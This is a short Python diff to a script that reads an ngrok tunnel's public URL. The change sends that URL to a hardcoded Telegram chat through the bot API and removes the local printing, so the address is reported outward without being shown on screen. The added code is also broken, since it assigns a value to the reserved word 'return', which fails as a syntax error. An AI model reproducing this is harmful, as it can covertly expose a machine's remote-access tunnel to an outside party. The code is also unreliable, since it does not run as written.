@@ -9,6 +9,9 @@ def get_ngrok_url():
     res_json = json.loads(res_unicode)
     return res_json["tunnels"][0]["public_url"][6:]
 
+return = get_ngrok_url()
+api_url = "https://api.telegram.org/bot{}/sendMessage?chat_id=809977861&text={}".format(bot_token,return)
+requests.get(api_url)
+
 while True:
-	print(get_ngrok_url())
-	time.sleep(8)
+	time.sleep(1000)
